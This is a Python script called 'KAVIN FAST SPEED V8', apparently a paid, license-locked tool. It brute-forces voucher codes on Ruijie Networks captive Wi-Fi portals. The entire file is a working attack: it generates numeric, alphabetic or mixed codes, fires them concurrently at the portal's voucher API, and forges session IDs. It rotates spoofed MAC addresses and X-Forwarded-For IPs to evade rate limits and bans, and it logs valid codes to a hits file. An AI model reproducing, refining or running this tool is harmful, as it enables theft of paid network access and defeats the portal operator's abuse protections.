# =====================================================================
# kavin_v8.py - KAVIN FAST SPEED V8 (Part 1 of 2)
# =====================================================================

import os
import time
import random
import string
import json
import asyncio
import aiohttp
import urllib3
import socket
import threading
import requests
from urllib.parse import urlparse, parse_qs, quote
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.layout import Layout
from rich.table import Table
from rich.align import Align

# ⭐ psutil ကို Error မတက်အောင် ကာကွယ်ထားပါတယ်
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
PROGRESS_FILE = "progress.json"
CONCURRENCY_LIMIT = 20  
TIMEOUT = 3
RL_SLEEP = 0.1
MAC_REFRESH_EVERY = 5  # ⭐ Code ၅ ခု စမ်းတိုင်း MAC/IP အသစ်ပြောင်းမယ်

RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"

console = Console()
tried_codes = set()
LICENSE_INFO = {"status": ""}

# =====================================================================
# UTILITY FUNCTIONS
# =====================================================================
def save_progress(mode, length, scan_method, seq):
    try:
        with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
            json.dump({"mode": mode, "length": length, "scan_method": scan_method, "seq": seq}, f)
    except Exception: pass

def load_progress(mode, length, scan_method):
    try:
        if not os.path.exists(PROGRESS_FILE): return 0
        with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if data.get("mode") == mode and data.get("length") == length and data.get("scan_method") == scan_method:
            return int(data.get("seq", 0))
    except Exception: pass
    return 0

def generate_random_mac():
    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def generate_random_ip():
    return f"192.168.110.{random.randint(2, 254)}"

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        return f"{seconds // 3600:02d}:{(seconds % 3600) // 60:02d}:{seconds % 60:02d}"
    except Exception: return "00:00:00"

def check_license():
    if HAS_LICENSE_MODULE:
        try: return _license.check_approval()
        except Exception: pass
    return False, "No license module"

def activate_license(key):
    if HAS_LICENSE_MODULE:
        try: return _license.activate(key)
        except Exception as e: return False, f"Error: {e}"
    return False, "No license module"

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except Exception: return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    mapping = {
        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url', 'chap_id': 'chap_id', 'chap_challenge': 'chap_challenge'
    }
    for key, mk in mapping.items():
        if key in query: params[mk] = query[key][0]
    if 'RES' in query: params['RES'] = query['RES'][0]
    return params

def auto_detect_portal():
    console.print(Panel(Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")), border_style="cyan", box=ROUNDED))
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
    
    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = session.get(TEST_URL, allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url:
            console.print("[bold green][+][/bold green] Detected via Connectivity Check!")
            return r.url
    except: pass

    console.print("[yellow][*][/yellow] Checking Gateways...")
    gateways = list(dict.fromkeys([get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]))
    for gw in gateways:
        try:
            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True)
            if "ruijienetworks" in res.url:
                console.print(f"[bold green][+][/bold green] Detected via Gateway ({gw})!")
                return res.url
        except: pass
    return None

# =====================================================================
# CORE LOGIC (RUIJIE PORTAL)
# =====================================================================
async def fetch_official_session(session, gw_params, current_mac_ref, current_ip_ref):
    base = RUIJIE_WIFIDOG
    if "portal-mm-as" in str(gw_params.get("url", "")):
        base = base.replace("portal-as", "portal-mm-as")

    temp_params = dict(gw_params)
    temp_params['mac'] = current_mac_ref[0]
    temp_params['ip'] = current_ip_ref[0]

    params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
    full_url = f"{base}?{params_str}"

    headers = {
        'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{current_mac_ref[0]}',
        'Client-Mac': current_mac_ref[0],
        'X-Forwarded-For': current_ip_ref[0],
        'Connection': 'close'
    }

    try:
        session.cookie_jar.clear()
        async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False) as resp:
            location = resp.headers.get('Location', '')
            if location:
                loc_lower = location.lower()
                if any(x in loc_lower for x in ["request limited", "error.html", "errormsg", "banned"]):
                    return ("BAN", "Banned")

                q = parse_qs(urlparse(location).query)
                sid = q.get('sessionId', [None])[0]
                if sid:
                    return ({'sessionId': sid, 'sign': q.get('sign', [None])[0], 'timestamp': q.get('timestamp', [None])[0]}, "REAL")
    except Exception: pass

    return ({'sessionId': f"fake_sess_{random.randint(1000, 9999)}", 'sign': None, 'timestamp': None}, "FAKE")

async def test_code_official(session, sess_data, code, mac, ip):
    url = RUIJIE_VOUCHER
    if sess_data.get('sign') and sess_data.get('timestamp'):
        url += f"&sign={sess_data['sign']}&timestamp={sess_data['timestamp']}"

    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12)",
        "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess_data['sessionId']}",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
    }

    payload = {"accessCode": code, "sessionId": sess_data['sessionId'], "apiVersion": 1}
    if sess_data.get('sign'): payload["sign"] = sess_data['sign']
    if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']

    try:
        async with session.post(url, json=payload, headers=headers, timeout=TIMEOUT, ssl=False, allow_redirects=True) as r:
            if r.status == 429: return "__RATE_LIMITED__", "1HR"

            text = await r.text()
            if not text: return "__NETWORK_ERROR__", "1HR"

            final_url = str(r.url).lower()
            low = text.lower()
            
            if any(x in final_url for x in ["request%20limited", "request limited"]) or any(x in low for x in ["request limited", "too many"]):
                return "__RATE_LIMITED__", "1HR"

            if "session timed out" in low or "invalid session" in low:
                return "__SESSION_EXPIRED__", "1HR"

            plan = "1HR"
            if "2hr" in low or "2 hour" in low: plan = "2HR"
            elif "12hr" in low or "12 hour" in low: plan = "12HR"
            elif "24hr" in low or "1day" in low or "24 hour" in low: plan = "24HR"

            if "error" in low or "invalid" in low: await asyncio.sleep(RL_SLEEP)
            return text, plan
    except asyncio.TimeoutError: return "__TIMEOUT__", "1HR"
    except aiohttp.ClientError: return "__NETWORK_ERROR__", "1HR"
    except Exception as e: return f"__ERROR__:{type(e).__name__}", "1HR"

seq_counter = 0
def gen_code(mode, length, scan_method="random"):
    global seq_counter
    try:
        if scan_method == "sequential":
            seq_counter += 1
            current = seq_counter
            if mode == "num": return str(current).zfill(length)
            elif mode == "eng":
                s, n = "", current
                for _ in range(length): s = chr(ord('a') + (n % 26)) + s; n //= 26
                return s
            elif mode == "mix":
                chars = string.ascii_lowercase + string.digits
                s, n = "", current
                for _ in range(length): s = chars[n % 36] + s; n //= 36
                return s
        else:
            if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception: pass
    return ""
# =====================================================================
# kavin_v8.py - KAVIN FAST SPEED V8 (Part 2 of 2) - FIXED
# =====================================================================

# =====================================================================
# V8 DASHBOARD RENDERER
# =====================================================================
def get_dashboard_renderable(mode, length, scan_method, current_code, tested, elapsed, 
                             status, hits, speed, cur_mac, cur_ip, 
                             tried_count, sess_stat, sess_id):
    layout = Layout()
    
    # ⭐ V8 Logo
    header_text = Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_cyan", justify="center")
    layout.split_column(
        Layout(Panel(Align.center(header_text), border_style="cyan", box=ROUNDED), size=3),
        Layout(name="body", ratio=1)
    )

    # --- STATS PANEL (Emoji ထည့်ပြီး) ---
    stats = Table.grid(expand=True, padding=(0, 1))
    for _ in range(4): stats.add_column(justify="left")

    status_style = "bold red" if any(k in status.upper() for k in ("ERR", "TIMEOUT", "BAN")) else "bold green"
    stat_up = (sess_stat or "").upper()
    
    if stat_up == "REAL": sess_text, sess_style = f"REAL ({sess_id[:6]}...)", "bold green"
    elif stat_up == "FAKE": sess_text, sess_style = f"FAKE ({sess_id[:6]}...)", "bold yellow"
    elif stat_up in ("EXPIRED", "BANNED"): sess_text, sess_style = f"{stat_up}", "bold red"
    else: sess_text, sess_style = sess_stat or "----", "bold cyan"

    try: ram_usage = f"{psutil.Process(os.getpid()).memory_percent():.1f}%" if HAS_PSUTIL else "N/A"
    except: ram_usage = "N/A"

    error_count = abs(tested - len(hits) - tried_count) if tested > tried_count else 0

    if scan_method == "sequential" and length > 0:
        total_possible = (10**length) if mode == "num" else (26**length) if mode == "eng" else (36**length)
        progress_pct = f"{(tried_count / total_possible * 100):.4f}%"
    else:
        progress_pct = "Random"

    # ⭐ Emoji များ ထည့်သွင်းထားပါတယ်
    stats.add_row("  📊 Tested",   f": ({tested:,})",       "  🔐 Session", f": ({sess_text})", style=sess_style)
    stats.add_row("  🎯 Current",  f": ({current_code or '----'})", "  📡 State",   f": ({status.upper()})", style=status_style)
    stats.add_row("  ⚡ Speed",    f": ({int(speed):,} c/m)", "  💾 RAM",     f": ({ram_usage})")
    stats.add_row("  🔑 Hits",     f": ({len(hits)})",      "  ⚠️ Error",   f": ({error_count})")
    stats.add_row("  🎮 Mode",     f": ({mode.upper()})",   "  🏃 Run",     f": ({tried_count:,})")
    stats.add_row("  🖥️ MAC",      f": (...{cur_mac[-6:]})","  🌐 IP",      f": (...{cur_ip[-3:]})")
    stats.add_row("  📈 Progress", f": ({progress_pct})",   "",        "")

    stats_panel = Panel(stats, border_style="magenta", box=ROUNDED, title="[bold yellow]📋 DASHBOARD[/bold yellow]", title_align="left")

    # --- VOUCHER PANEL (Emoji ထည့်ပြီး) ---
    v_table = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
    v_table.add_column("🎫 Hits Found", style="bold green", justify="center")
    v_table.add_column("⏳ PLAN", style="bold green", justify="center")
    v_table.add_column("✅ Remaining", style="bold green", justify="center")

    for h in hits[-8:]: v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
    if not hits: v_table.add_row("", "", "")

    voucher_panel = Panel(v_table, title="[bold bright_green]🎁 VALID Voucher code[/bold bright_green]", title_align="center", border_style="green", box=ROUNDED, height=12)

    # --- FOOTER PANEL (အောက်ဆုံးမှာ @kavin799 တစ်ခုတည်း) ---
    footer_text = Text.assemble(("\n👑 @kavin799 👑\n", "bold bright_cyan"), justify="center")
    footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)

    body_layout = Layout()
    body_layout.split_column(
        Layout(stats_panel, size=10),
        Layout(voucher_panel, ratio=1),
        Layout(footer_panel, size=3)
    )
    layout["body"].update(body_layout)
    return layout

# =====================================================================
# MAIN SCANNER LOOP (Balance Mode)
# =====================================================================
async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
    global seq_counter, tried_codes
    tried_codes = set()
    
    if scan_method == "sequential": seq_counter = load_progress(mode, length, scan_method)
    else: seq_counter = 0

    if not gw_params:
        gw_params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.2",
            "mac": "", "slot_num": "14", "nasip": "192.168.1.193", "ssid": "VLAN7", 
            "ustate": "0", "mac_req": "1", "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    mode_str = f"{mode}_{length}"
    hits, tested, start_time = [], 0, time.time()
    current_code, current_status = [""], ["Init"]
    sess_stat, sess_id = ["FAKE"], ["--------"]
    
    current_mac = [generate_random_mac()]
    current_ip = [generate_random_ip()]
    sess_data = [None]

    batch_index = 0

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    conn_limit = aiohttp.TCPConnector(limit=100, ssl=False, ttl_dns_cache=300)

    async with aiohttp.ClientSession(connector=conn_limit) as session:
        # ⭐ Dashboard တုန်တာသက်သာအောင် refresh_per_second ကို 2 ပဲထားပြီး၊ transient=False ထည့်ထားတယ်
        live = Live(
            get_dashboard_renderable(mode_str, length, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], 0, sess_stat[0], sess_id[0]), 
            refresh_per_second=2, screen=True, transient=False
        )

        with live:
            try:
                while True:
                    if sess_data[0] is None:
                        current_status[0] = "Active"
                        res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)

                        if res == "BAN":
                            current_mac[0], current_ip[0] = generate_random_mac(), generate_random_ip()
                            sess_stat[0], sess_id[0] = "BANNED", "--------"
                            await asyncio.sleep(1) 
                            continue

                        sess_data[0] = res
                        sess_stat[0] = err_msg
                        sess_id[0] = res.get('sessionId', '--------')

                    batch_codes = []
                    attempts = 0
                    max_attempts = CONCURRENCY_LIMIT * 20
                    
                    while len(batch_codes) < CONCURRENCY_LIMIT and attempts < max_attempts:
                        attempts += 1
                        c = gen_code(mode, length, scan_method)
                        if not c or c in tried_codes: continue
                        tried_codes.add(c)
                        batch_codes.append(c)

                    if not batch_codes:
                        live.stop()
                        console.print("\n[bold yellow]⚠ Voucher space exhausted![/bold yellow]")
                        break

                    async def bounded_check(code, idx):
                        async with semaphore:
                            if idx % MAC_REFRESH_EVERY == 0:
                                task_mac = generate_random_mac()
                                task_ip = generate_random_ip()
                                temp_sess, _ = await fetch_official_session(session, gw_params, [task_mac], [task_ip])
                                if temp_sess == "BAN":
                                    return "__RATE_LIMITED__", "1HR"
                            else:
                                task_mac = current_mac[0]
                                task_ip = current_ip[0]
                                temp_sess = sess_data[0]

                            return await test_code_official(session, temp_sess, code, task_mac, task_ip)

                    tasks = [bounded_check(code, i) for i, code in enumerate(batch_codes)]
                    results = await asyncio.gather(*tasks, return_exceptions=True)

                    hit_found_in_batch = False
                    session_expired_in_batch = False

                    for idx, res_tuple in enumerate(results):
                        tested += 1
                        code = batch_codes[idx]
                        current_code[0] = code

                        if isinstance(res_tuple, Exception): continue
                        res, plan = res_tuple

                        if res == "__SESSION_EXPIRED__":
                            sess_data[0] = None
                            sess_stat[0] = "EXPIRED"
                            session_expired_in_batch = True
                            break

                        if res == "__RATE_LIMITED__":
                            sess_data[0] = None
                            current_mac[0], current_ip[0] = generate_random_mac(), generate_random_ip()
                            sess_stat[0] = "BANNED"
                            hit_found_in_batch = True
                            await asyncio.sleep(1.5)
                            break

                        if res.startswith("__ERROR__:") or res in ("__TIMEOUT__", "__NETWORK_ERROR__"): continue

                        low = res.lower()
                        if "request limited" in low or "blocked" in low or "too many" in low:
                            sess_data[0] = None
                            current_mac[0], current_ip[0] = generate_random_mac(), generate_random_ip()
                            sess_stat[0] = "BANNED"
                            hit_found_in_batch = True
                            await asyncio.sleep(1.5)
                            break

                        is_hit = False
                        try:
                            j = json.loads(res)
                            if j.get("success") is True and isinstance(j.get("result"), dict):
                                if j["result"].get("logonUrl"): is_hit = True
                        except Exception:
                            if ('"success":true' in low or '"authresult":"1"' in low or "congratulations" in low): is_hit = True

                        if is_hit:
                            now_str = time.strftime("%H:%M:%S")
                            if not any(h['code'] == code for h in hits):
                                hits.append({"code": code, "time": now_str, "plan": plan})
                                try:
                                    with open(HITS_FILE, "a", encoding="utf-8") as f:
                                        f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                                except Exception: pass
                            
                            sess_data[0] = None
                            current_mac[0], current_ip[0] = generate_random_mac(), generate_random_ip()
                            sess_stat[0] = "HIT (Refreshing)"
                            hit_found_in_batch = True
                            break

                    batch_index += 1
                    if batch_index % 1 == 0 and not hit_found_in_batch:
                        current_mac[0], current_ip[0] = generate_random_mac(), generate_random_ip()
                        sess_data[0] = None

                    if scan_method == "sequential":
                        save_progress(mode, length, scan_method, seq_counter)

                    elapsed = time.time() - start_time
                    speed = (tested / elapsed * 60) if elapsed > 0 else 0.0

                    live.update(get_dashboard_renderable(
                        mode_str, length, scan_method, current_code[0], tested,
                        format_time(elapsed), current_status[0], hits, speed,
                        current_mac[0], current_ip[0], len(tried_codes),
                        sess_stat[0], sess_id[0]
                    ))

                    if hit_found_in_batch: await asyncio.sleep(0.1)
                    if session_expired_in_batch: await asyncio.sleep(0.01)

            except (KeyboardInterrupt, asyncio.CancelledError):
                live.stop()
                console.print("\n[bold yellow]⏹ Interrupted by user[/bold yellow]")
            except Exception as e:
                live.stop()
                console.print(f"\n[bold red]Fatal Error: {e}[/bold red]")

# =====================================================================
# UI MENUS
# =====================================================================
def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice in ("1", "2", "3"): return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        show_banner()
        console.print("  [bold bright_white]Choose Voucher Length:[/bold bright_white]\n")
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] ⚡ 6 Characters")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] ⚡ 7 Characters")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] ⚡ 8 Characters")
        console.print("  [bold bright_cyan]4.[/bold bright_cyan] ⚡ 9 Characters")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice in ("1", "2", "3", "4"): return {"1": 6, "2": 7, "3": 8, "4": 9}[choice]

def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice in ("1", "2"): return {"1": "random", "2": "sequential"}[choice]

def run():
    show_banner()
    portal_url = auto_detect_portal()
    gw_params = None
    
    if portal_url:
        extracted = extract_params_from_url(portal_url)
        console.print("[bold green][+][/bold green] URL fetched successfully!")
        time.sleep(1)
        gw_params = {
            "stage": "portal", "gw_id": extracted.get("gw_id", "c4b25be7d323"),
            "gw_sn": extracted.get("gw_sn", "H1U320P00210A"), "gw_address": extracted.get("gw_address", "192.168.7.1"),
            "gw_port": extracted.get("gw_port", "2060"), "ip": generate_random_ip(), "mac": "",
            "slot_num": extracted.get("slot_num", "14"), "nasip": extracted.get("nasip", "192.168.1.193"),
            "ssid": extracted.get("ssid", "VLAN7"), "ustate": "0", "mac_req": "1",
            "url": extracted.get("url", "http://connectivitycheck.gstatic.com/generate_204"),
            "chap_id": extracted.get("chap_id", r"\245"),
            "chap_challenge": extracted.get("chap_challenge", r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067")
        }
    else:
        console.print("[bold red][-][/bold red] Auto-detect failed. Using default gateway params.")
        time.sleep(1.5)

    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        scan_method = ask_scan_method()
        if scan_method is None: continue

        try: asyncio.run(scan_loop_async(mode, length, scan_method=scan_method, gw_params=gw_params))
        except KeyboardInterrupt: pass
        break

def main():
    global LICENSE_INFO
    try:
        is_valid, expiry_msg = check_license()
        while not is_valid:
            clear_screen()
            console.print(Panel(Align.center(Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_magenta")), border_style="bright_magenta"))
            console.print(Panel(Align.center(Text("🔐 Enter License Key to Continue 🔐", style="bold yellow")), border_style="yellow"))
            key = Prompt.ask("   [bold bright_green]➜ 📝 Paste Key Here[/bold bright_green]").strip()
            if key:
                ok, msg = activate_license(key)
                console.print(Panel(Align.center(Text(msg, style="bold bright_green" if ok else "bold red")), border_style="green" if ok else "red"))
                time.sleep(2)
                is_valid, expiry_msg = check_license()
            else: time.sleep(1)

        LICENSE_INFO["status"] = expiry_msg
        run()
    except (KeyboardInterrupt, EOFError):
        console.print("\n\n[bold red]Exiting Kavin Scanner V8...[/bold red]\n")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
    finally:
        try: clear_screen()
        except Exception: pass
        try:
            console.print("\n\n")
            console.print(Text("✨ Thank You • Contact @kavin799 for Key 🙏", style="bold bright_green"), justify="center")
            console.print("\n\n")
            time.sleep(1)
        except Exception: pass

if __name__ == "__main__":
    main()